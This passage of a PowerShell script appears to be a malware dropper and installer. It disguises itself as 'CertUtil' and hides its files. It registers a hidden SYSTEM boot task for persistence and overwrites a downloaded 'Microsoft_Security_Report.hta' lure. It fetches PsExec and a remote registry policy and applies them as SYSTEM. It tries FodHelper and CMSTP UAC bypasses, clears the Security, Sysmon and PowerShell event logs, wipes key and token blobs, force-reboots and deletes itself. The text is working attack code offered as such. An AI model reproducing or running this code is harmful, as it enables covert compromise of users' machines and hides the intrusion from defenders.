        Set-ItemProperty -Path $_.FullName -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -Force
    }
    Get-ChildItem -Path $programBase -Directory | Where-Object { $_.FullName -ne $programBase } | ForEach-Object {
        Set-ItemProperty -Path $_.FullName -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -Force
    }
    Write-Log -Message "Hidden attributes applied"

    Write-Log -Message "EXIT Extract-And-Install => TRUE"
    return $true
}

function Install-BootTask {
    param(
        [string]$ExePath,
        [string]$Arguments = ""
    )
    Write-Log -Message "ENTER Install-BootTask ExePath=$ExePath Arguments=$Arguments"
    $bootTaskName = "CertUtil"
    if (-not (Test-Path $ExePath)) {
        Write-Log -Message "ExePath not found: $ExePath" -Level "ERROR"
        return $false
    }
    try {
        Write-Log -Message "Unregistering existing boot task"
        Unregister-ScheduledTask -TaskName $bootTaskName -Confirm:$false -ErrorAction SilentlyContinue
        $action = New-ScheduledTaskAction -Execute $ExePath -Argument $Arguments  
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType S4U -RunLevel Highest
        Register-ScheduledTask -TaskName $bootTaskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force -ErrorAction Stop
        Write-Log -Message "Boot task registered via cmdlet, running it"
        & schtasks /run /tn $bootTaskName 2>&1 | Out-Null
        Write-Log -Message "EXIT Install-BootTask => TRUE (cmdlet)"
        return $true
    } catch {
        Write-LogError -Context "Install-BootTask:Register-ScheduledTask" -ErrorRecord $_
        Write-Log -Message "Falling back to schtasks XML for boot task"
        try {
            $xmlPath = "$env:TEMP\boot_task.xml"
            $xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>$(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')</Date></RegistrationInfo>
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Settings><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>"$ExePath"</Command><Arguments>$Arguments</Arguments></Exec></Actions>
   <Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel><UserId>SYSTEM</UserId><LogonType>S4U</LogonType></Principal></Principals>
</Task>
"@
            $xml | Out-File -FilePath $xmlPath -Encoding unicode -Force
            & schtasks /create /tn $bootTaskName /xml $xmlPath /f 2>&1 | Out-Null
            Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
            & schtasks /run /tn $bootTaskName 2>&1 | Out-Null
            Write-Log -Message "EXIT Install-BootTask => TRUE (schtasks)"
            return $true
        } catch {
            Write-LogError -Context "Install-BootTask:schtasks fallback" -ErrorRecord $_
            Write-Log -Message "EXIT Install-BootTask => FALSE"
            return $false
        }
    }
}

function Finalize-Install {
    Write-Log -Message "ENTER Finalize-Install"
    Write-Log -Message "Stopping/Deleting service CertUtil"
    & sc.exe stop "CertUtil" 2>&1 | Out-Null
    Start-Sleep -Seconds 1
    & sc.exe delete "CertUtil" 2>&1 | Out-Null
    Start-Sleep -Seconds 1
    
    try {
        $dfPath = Join-Path $env:USERPROFILE 'Downloads\Microsoft_Security_Report.hta'
        Write-Log -Message "Looking for default HTA at: $dfPath"
        if (-not (Test-Path $dfPath)) {
            $dfPath = Get-ChildItem -Path "$env:USERPROFILE\Downloads" -Filter *.hta `
                Sort-Object LastWriteTime -Descending `
                Select-Object -First 1 -ExpandProperty FullName
            Write-Log -Message "Fallback HTA path: $dfPath"
        }

        if ($dfPath -and (Test-Path $dfPath)) {
            Set-Content -Path $dfPath -Value "MFA:f10fnsSak13" -Encoding UTF8 -Force
            Write-Log -Message "HTA overwritten: $dfPath"
        } else {
            Write-Log -Message "No HTA file found to overwrite" -Level "WARN"
        }
    } catch {
        Write-LogError -Context "Finalize-Install:HTA" -ErrorRecord $_
    }

    $certPath = "$programBase\certutil.exe"
    $starter = "$programBase\CertStart.exe"
    Write-Log -Message "certPath exists=$(Test-Path $certPath) starter exists=$(Test-Path $starter)"

    if (Test-Path $starter) {
        Write-Log -Message "Installing boot task via starter"
        Install-BootTask -ExePath $starter -Arguments "`"$certPath`" C:\Windows\System32\certutil.exe" | Out-Null
    } else {
        if (Test-Path $certPath) {
            Write-Log -Message "Installing boot task via certPath directly"
            Install-BootTask -ExePath $certPath | Out-Null
        } else {
            Write-Log -Message "Neither starter nor certPath exists!" -Level "ERROR"
        }
    }

    $flagPath = "HKLM:\Software\CertUtil"
    if (-not (Test-Path $flagPath)) {
        Write-Log -Message "Creating registry flag: $flagPath"
        New-Item -Path $flagPath -Force | Out-Null
    }
    Set-ItemProperty -Path $flagPath -Name "Installed" -Value 1 -Force
    Write-Log -Message "Registry flag set"

    $xorKeyPath = "$programBase\xr9999.blob"
    if (Test-Path $xorKeyPath) {
        Write-Log -Message "Wiping xorKey blob"
        $null = [System.IO.File]::WriteAllBytes($xorKeyPath, (New-Object byte[] 4096))
        Remove-Item $xorKeyPath -Force -ErrorAction SilentlyContinue
    }
    $tkPath = "$programBase\tk9999.blob"
    if (Test-Path $tkPath) {
        Write-Log -Message "Wiping token blob"
        $null = [System.IO.File]::WriteAllBytes($tkPath, (New-Object byte[] 4096))
        Remove-Item $tkPath -Force -ErrorAction SilentlyContinue
    }
    try {
        Write-Log -Message "Clearing event logs"
        Clear-EventLog -LogName Security
        Clear-EventLog -LogName "Microsoft-Windows-Sysmon/Operational"
        Clear-EventLog -LogName "Microsoft-Windows-PowerShell/Operational"
        Clear-EventLog -LogName Application
        Write-Log -Message "Event logs cleared"
    } catch {
        Write-LogError -Context "Finalize-Install:ClearEventLog" -ErrorRecord $_
    }
    Write-Log -Message "EXIT Finalize-Install"
}

function Cleanup-Environment {
    Write-Log -Message "ENTER Cleanup-Environment"
    & sc.exe stop "CertUtil" 2>&1 | Out-Null
    Start-Sleep -Seconds 2
    & sc.exe delete "CertUtil" 2>&1 | Out-Null

    try { Unregister-ScheduledTask -TaskName "CertUtil" -Confirm:$false -ErrorAction SilentlyContinue } catch {
        Write-LogError -Context "Cleanup-Environment:Unregister CertUtil" -ErrorRecord $_
    }
    Remove-ResumeTask

    if (Test-Path $programBase) {
        Write-Log -Message "Removing programBase: $programBase"
        Remove-Item $programBase -Recurse -Force -ErrorAction SilentlyContinue
    }

    $licensePath = "C:\Windows\System32\License.rtf"
    if (Test-Path $licensePath) {
        Write-Log -Message "Removing ADS from License.rtf"
        Get-Item -Path $licensePath -Stream * -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Stream -ne ':$DATA') {
                Remove-Item -Path $licensePath -Stream $_.Stream -Force -ErrorAction SilentlyContinue
            }
        }
    }

    $flagPath = "HKLM:\Software\CertUtil"
    if (Test-Path $flagPath) {
        Write-Log -Message "Removing registry flag: $flagPath"
        Remove-Item $flagPath -Recurse -Force -ErrorAction SilentlyContinue
    }
    Write-Log -Message "EXIT Cleanup-Environment"
}

function Reboot-System {
    Write-Log -Message "ENTER Reboot-System, sleeping 60s before reboot"
    Start-Sleep -Seconds 60
    Write-Log -Message "Issuing shutdown /r /t 0 /f"
    Start-Process -FilePath "shutdown.exe" -ArgumentList "/r /t 0 /f" -WindowStyle Hidden
    Write-Log -Message "EXIT Reboot-System"
}

function SelfDestruct {
    Write-Log -Message "ENTER SelfDestruct"
    $paths = @($scriptPath, $sharedScriptPath, "$env:PUBLIC\autoexec.ps1")
    Write-Log -Message "SelfDestruct target paths: $($paths -join ' | ')"
    foreach ($p in $paths) {
        if (Test-Path $p) {
            Write-Log -Message "Scheduling delete for: $p"
            Start-Process -WindowStyle Hidden -FilePath $tempCmd -ArgumentList "/c timeout 1 >nul && del /f /q `"$p`""
        } else {
            Write-Log -Message "Path not present, skip: $p"
        }
    }
    Write-Log -Message "EXIT SelfDestruct"
}

# ============================================================
# MAIN LOGIC
# ============================================================
Write-Log -Message "Calling Copy-ExecutablesToTemp"
Copy-ExecutablesToTemp | Out-Null

Write-Log -Message "Calling Ensure-SharedScript"
$sharedOk = Ensure-SharedScript
Write-Log -Message "Ensure-SharedScript => $sharedOk"
if (-not $sharedOk) {
    Write-Log -Message "WARN: shared script not available, elevation will likely fail" -Level "WARN"
}

if ($Clean) {
    Write-Log -Message "BRANCH: Clean mode"
    Cleanup-Environment
    # Nessun SelfDestruct: l'utente potrebbe voler rieseguire -Clean
    Write-Log -Message "EXIT script after Clean"
    exit 0
}

if ($Resume) {
    Write-Log -Message "BRANCH: Resume mode"
    $extractOk = Extract-And-Install
    Write-Log -Message "Resume: Extract-And-Install => $extractOk"
    if ($extractOk) {
        Finalize-Install
        Remove-ResumeTask
        # Nessun SelfDestruct: installazione completata con successo
    } else {
        Write-Log -Message "Resume: extraction failed, waiting 60s and retrying"
        Start-Sleep -Seconds 60
        $extractOk = Extract-And-Install
        Write-Log -Message "Resume: retry Extract-And-Install => $extractOk"
        if ($extractOk) {
            Finalize-Install
        } else {
            Write-Log -Message "Resume: retry failed, fatal error, self-destructing" -Level "ERROR"
            SelfDestruct
        }
        Remove-ResumeTask
    }
    Write-Log -Message "EXIT script after Resume"
    exit 0
}

if ($ApplyPolicy) {
    Write-Log -Message "BRANCH: ApplyPolicy mode"
    $regFile = "$env:TEMP\policy.decoded.reg"
    Write-Log -Message "ApplyPolicy: regFile=$regFile exists=$(Test-Path $regFile)"
    if (Test-Path $regFile) {
        if (Test-IsSystem) {
            Write-Log -Message "ApplyPolicy: running as SYSTEM, applying reg via regedit"
            Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$regFile`"" -Wait -WindowStyle Hidden
        } else {
            Write-Log -Message "ApplyPolicy: not SYSTEM, need PsExec"
            if (-not (Test-Path $psexecPath)) {
                Write-Log -Message "PsExec not found, downloading"
                $null = Download-AndExtractPsExec
            }
            if (Test-Path $psexecPath) {
                Write-Log -Message "ApplyPolicy: invoking PsExec to run regedit as SYSTEM"
                Start-Process -FilePath $psexecPath -ArgumentList "-accepteula -s -i regedit.exe /s `"$regFile`"" -Wait -WindowStyle Hidden
            } else {
                Write-Log -Message "ApplyPolicy: PsExec unavailable, self-destructing" -Level "ERROR"
                SelfDestruct
                exit 1
            }
        }
    } else {
        Write-Log -Message "ApplyPolicy: regFile missing, self-destructing" -Level "ERROR"
        SelfDestruct
        exit 1
    }
    Write-Log -Message "ApplyPolicy: creating resume task and rebooting"
    New-ResumeTask | Out-Null
    Reboot-System
    Write-Log -Message "EXIT script after ApplyPolicy"
    exit 0
}

if (Test-IsSystem) {
    Write-Log -Message "BRANCH: SYSTEM detected, Finalize-Install and exit"
    Finalize-Install
    Write-Log -Message "EXIT script after SYSTEM finalize"
    exit 0
}

Write-Log -Message "BRANCH: standard user flow"
if (-not (Test-Path $psexecPath)) {
    Write-Log -Message "PsExec not found, downloading"
    $null = Download-AndExtractPsExec
} else {
    Write-Log -Message "PsExec already present"
}

$policyRegLocal = "$env:TEMP\policy.reg"
Write-Log -Message "Downloading policy reg from $policyRegUrl to $policyRegLocal"
if (Download-File -Url $policyRegUrl -OutPath $policyRegLocal) {
    Write-Log -Message "Policy reg downloaded, converting"
    $decodedReg = Convert-PolicyReg -Path $policyRegLocal
    Write-Log -Message "Decoded reg path: $decodedReg"
} else {
    Write-Log -Message "Policy reg download failed" -Level "WARN"
}

if (Test-IsAdmin) {
    Write-Log -Message "BRANCH: Admin (non-SYSTEM) flow"
    Extract-And-Install
    $applyCmd = "$psexecPath -accepteula -s -i $powershellPath -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$sharedScriptPath`" -ApplyPolicy"
    Write-Log -Message "Admin: launching ApplyPolicy via cmd: $applyCmd"
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $applyCmd" -WindowStyle Hidden -Wait
    New-ResumeTask | Out-Null
    Reboot-System
    Write-Log -Message "EXIT script after Admin flow"
    exit 0
}

Write-Log -Message "BRANCH: User (non-admin) flow, attempting UAC bypass"
$elevateCmd = "$tempPwsh -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$sharedScriptPath`" -ApplyPolicy"
Write-Log -Message "elevateCmd=$elevateCmd"
$bypassSuccess = Start-Fod -CommandToExecute $elevateCmd
Write-Log -Message "Start-Fod => $bypassSuccess"
if (-not $bypassSuccess) {
    Write-Log -Message "FOD failed, trying CMSTP"
    $bypassSuccess = Start-Cmstp -CommandToExecute $elevateCmd
    Write-Log -Message "Start-Cmstp => $bypassSuccess"
}
if ($bypassSuccess) {
    Write-Log -Message "UAC bypass dispatched, sleeping 120s"
    Start-Sleep -Seconds 120
    Write-Log -Message "EXIT script after bypass success"
    exit 0
} else {
    Write-Log -Message "Both FOD and CMSTP failed, self-destructing" -Level "ERROR"
    SelfDestruct
    Write-Log -Message "EXIT script after bypass failure"
    exit 1
}